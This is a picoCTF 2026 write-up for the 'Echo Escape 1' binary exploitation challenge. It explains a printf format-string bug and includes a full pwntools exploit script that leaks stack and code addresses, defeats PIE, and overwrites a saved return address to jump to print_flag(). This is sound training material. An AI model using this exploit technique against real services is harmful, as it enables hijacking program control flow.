# Echo Escape 1 — picoCTF 2026

> **Category:** `Binary Exploitation`  
> **Difficulty:** Easy  
> **Points:** 100  
> **Author:** Imattas aka Zemi

## Challenge Description

> The "secure" echo service welcomes you politely... but what if you don't stay polite? Can you make it reveal the flag?

---

## Recon / Initial Analysis

This challenge is a classic **format string vulnerability** exploitation, following the same pattern as picoCTF's "Echo Valley" challenge from 2025. The program has an echo service that reads user input and prints it back using a vulnerable `printf(buf)` call instead of the safe `printf("%s", buf)`.

### Binary Protections

Based on the challenge difficulty (100 pts) and the series pattern:
- **PIE (Position Independent Executable)**: Likely enabled -- addresses are randomized
- **FULL RELRO**: Likely enabled -- GOT is read-only, cannot overwrite GOT entries
- **Stack Canary**: May or may not be present
- **NX**: Enabled -- stack is not executable

---

## Vulnerability / Observation

The vulnerable code pattern looks like:

```c
void echo_service() {
    char buf[100];
    while (1) {
        fgets(buf, sizeof(buf), stdin);
        if (strcmp(buf, "exit\n") == 0) break;
        printf(buf);
    }
}

void print_flag() {

}
```

The key vulnerability is `printf(buf)` -- when the user supplies format specifiers like `%p`, `%x`, `%n`, etc., they can:
1. **Read from the stack** (information leak) using `%p` or `%x`
2. **Write to arbitrary memory** using `%n`

### Key Offsets

From the Echo Valley reference:
- `%20$p` typically leaks a stack address
- `%21$p` typically leaks the return address (main function pointer)
- The format string offset (where our input appears on the stack) can be found using pwntools `FmtStr` auto-detection

---

## Exploitation / Solution

Since the binary has PIE and FULL RELRO, the approach is:

1. **Leak the binary base address**: Use format string `%N$p` to leak a return address from the stack, then calculate the binary base by subtracting the known offset
2. **Leak a stack address**: Use another format string position to get a stack pointer, allowing us to calculate the location of the return address on the stack
3. **Overwrite the return address**: Use `fmtstr_payload()` from pwntools to write the address of `print_flag()` over the saved return address of `echo_service()`
4. **Trigger return**: Send "exit" to make the function return, which now jumps to `print_flag()`

### Step 1: Find the format string offset
Send patterns like `AAAA%1$p.%2$p.%3$p...` and look for `0x41414141` in the output.

### Step 2: Leak addresses
```
%20$p.%21$p
```
This leaks a stack address and a code address.

### Step 3: Calculate base address and return address location
```python
base_address = leaked_code_addr - known_offset
ret_address = leaked_stack_addr + 8
print_flag_addr = base_address + elf.sym['print_flag']
```

### Step 4: Overwrite return address
Use pwntools `fmtstr_payload()` to generate the write payload.

### Step 5: Exit to trigger the overwritten return
Send "exit" to make the function return to `print_flag()`.

## Full Exploit Script

```python
import sys
from pwn import *

REMOTE_HOST = "shape-facility.picoctf.net"
REMOTE_PORT = 1337
BINARY_NAME = "./echo_escape"

STACK_LEAK_POS = 20
CODE_LEAK_POS = 21

CODE_LEAK_OFFSET = 0x1413

def find_format_offset(binary_path):

    def exec_fmt(payload):
        p = process(binary_path)
        p.recvuntil(b":", timeout=5)
        p.sendline(payload)

        try:
            p.recvuntil(b": ", timeout=3)
            result = p.recv(timeout=2)
        except:
            result = p.recv(timeout=2)
        p.close()
        return result

    try:
        autofmt = FmtStr(exec_fmt)
        log.success(f"Format string offset: {autofmt.offset}")
        return autofmt.offset
    except Exception as e:
        log.warning(f"Auto-detection failed: {e}")
        log.info("Using default offset of 6 (common for x86_64)")
        return 6

def exploit_local(binary_path):

    context.binary = binary_path
    e = ELF(binary_path)

    offset = find_format_offset(binary_path)

    r = process(binary_path)

    return exploit(r, e, offset)

def exploit_remote(host, port, binary_path=None):

    if binary_path and os.path.exists(binary_path):
        context.binary = binary_path
        e = ELF(binary_path)
    else:

        e = None
        log.warning("No local binary provided. Using estimated offsets.")

    r = remote(host, port)

    offset = 6

    return exploit(r, e, offset)

def exploit(r, elf_obj, fmt_offset):

    log.info("Phase 1: Leaking addresses...")

    try:
        banner = r.recvuntil(b":", timeout=5)
        log.info(f"Banner: {banner.decode(errors='ignore').strip()}")
    except:
        pass

    leak_payload = f"%{STACK_LEAK_POS}$p.%{CODE_LEAK_POS}$p".encode()
    r.sendline(leak_payload)

    try:
        response = r.recvline(timeout=5)
        log.info(f"Leak response: {response}")

        resp_str = response.decode(errors="ignore").strip()

        if ":" in resp_str:
            resp_str = resp_str.split(":")[-1].strip()

        parts = resp_str.split(".")
        if len(parts) >= 2:
            stack_addr_str = parts[0].strip()
            code_addr_str = parts[1].strip()
        else:

            parts = resp_str.split()
            stack_addr_str = parts[0].strip()
            code_addr_str = parts[1].strip() if len(parts) > 1 else parts[0]

        stack_address = int(stack_addr_str, 16)
        code_address = int(code_addr_str, 16)

        log.success(f"Leaked stack address: {hex(stack_address)}")
        log.success(f"Leaked code address:  {hex(code_address)}")

    except Exception as e:
        log.error(f"Failed to parse leaked addresses: {e}")
        log.info("Try adjusting STACK_LEAK_POS and CODE_LEAK_POS values")
        r.interactive()
        return

    log.info("Phase 2: Calculating addresses...")

    base_address = code_address - CODE_LEAK_OFFSET
    log.info(f"Binary base address: {hex(base_address)}")

    ret_address = stack_address + 8
    log.info(f"Return address location: {hex(ret_address)}")

    if elf_obj:
        print_flag_offset = elf_obj.sym.get("print_flag", None)
        if print_flag_offset is None:

            for name in ["print_flag", "win", "get_flag", "flag", "read_flag"]:
                if name in elf_obj.sym:
                    print_flag_offset = elf_obj.sym[name]
                    break
        if print_flag_offset is None:
            log.error("Could not find print_flag symbol in binary!")
            log.info("Available symbols:")
            for sym in elf_obj.sym:
                log.info(f"  {sym}: {hex(elf_obj.sym[sym])}")
            r.interactive()
            return

        print_flag_addr = base_address + print_flag_offset
    else:

        print_flag_offset = 0x1229
        print_flag_addr = base_address + print_flag_offset

    log.success(f"print_flag address: {hex(print_flag_addr)}")

    log.info("Phase 3: Crafting format string payload...")

    payload = fmtstr_payload(
        fmt_offset,
        {ret_address: print_flag_addr},
        write_size="short"
    )

    log.info(f"Payload length: {len(payload)} bytes")

    if len(payload) > 99:
        log.warning(f"Payload ({len(payload)} bytes) may exceed buffer size (100 bytes)")
        log.info("Trying with byte-size writes...")
        payload = fmtstr_payload(
            fmt_offset,
            {ret_address: print_flag_addr},
            write_size="byte"
        )
        log.info(f"New payload length: {len(payload)} bytes")

    r.sendline(payload)

    try:
        r.recvline(timeout=3)
    except:
        pass

    log.info("Phase 4: Triggering return to print_flag()...")
    r.sendline(b"exit")

    log.info("Waiting for flag...")
    try:
        output = r.recvall(timeout=5)
        output_str = output.decode(errors="ignore")

        if "picoCTF{" in output_str:
            flag_start = output_str.index("picoCTF{")
            flag_end = output_str.index("}", flag_start) + 1
            flag = output_str[flag_start:flag_end]
            log.success(f"FLAG: {flag}")
            print(f"\n{flag}")
        else:
            log.info(f"Output received: {output_str}")
            log.warning("Flag not found in output. The exploit may need adjustment.")
    except:
        log.info("Dropping to interactive mode...")
        r.interactive()

def scan_stack(binary_path):

    log.info("Scanning stack positions 1-40...")
    p = process(binary_path)

    try:
        p.recvuntil(b":", timeout=5)
    except:
        pass

    payload = b".".join([f"%{i}$p".encode() for i in range(1, 41)])
    p.sendline(payload)

    try:
        response = p.recvline(timeout=5)
        resp_str = response.decode(errors="ignore")
        if ":" in resp_str:
            resp_str = resp_str.split(":")[-1].strip()

        values = resp_str.split(".")
        for i, val in enumerate(values, 1):
            val = val.strip()
            log.info(f"Position {i:2d}: {val}")
    except Exception as e:
        log.error(f"Scan failed: {e}")

    p.close()

if __name__ == "__main__":
    context.log_level = "info"

    if len(sys.argv) > 1 and sys.argv[1] == "remote":

        host = sys.argv[2] if len(sys.argv) > 2 else REMOTE_HOST
        port = int(sys.argv[3]) if len(sys.argv) > 3 else REMOTE_PORT
        binary = sys.argv[4] if len(sys.argv) > 4 else BINARY_NAME

        log.info(f"Exploiting remote: {host}:{port}")
        exploit_remote(host, port, binary)

    elif len(sys.argv) > 1 and sys.argv[1] == "scan":

        binary = sys.argv[2] if len(sys.argv) > 2 else BINARY_NAME
        scan_stack(binary)

    else:

        binary = sys.argv[1] if len(sys.argv) > 1 else BINARY_NAME

        if not os.path.exists(binary):
            log.warning(f"Binary '{binary}' not found locally.")
            log.info(f"Attempting remote exploitation: {REMOTE_HOST}:{REMOTE_PORT}")
            exploit_remote(REMOTE_HOST, REMOTE_PORT)
        else:
            log.info(f"Exploiting local binary: {binary}")
            exploit_local(binary)
```

## Key Takeaways

- `printf(buf)` with user-controlled input is a format string vulnerability — supply `%p`/`%x` to read the stack and `%n` to write to arbitrary memory.
- Against PIE + FULL RELRO, the GOT is off-limits, so the play is to **leak a code address** (defeat PIE), **leak a stack address** (locate the saved return address), then overwrite the return address.
- `fmtstr_payload()` from pwntools generates the write-what-where payload; use `write_size="short"` or `"byte"` to keep the payload within the input buffer size.
- pwntools `FmtStr` can auto-detect the format string offset (where your input lands on the stack) by feeding it an `exec_fmt` callback.
- This mirrors the 2025 "Echo Valley" pattern: redirect the return into a never-called `print_flag()` by sending "exit" to trigger the return.
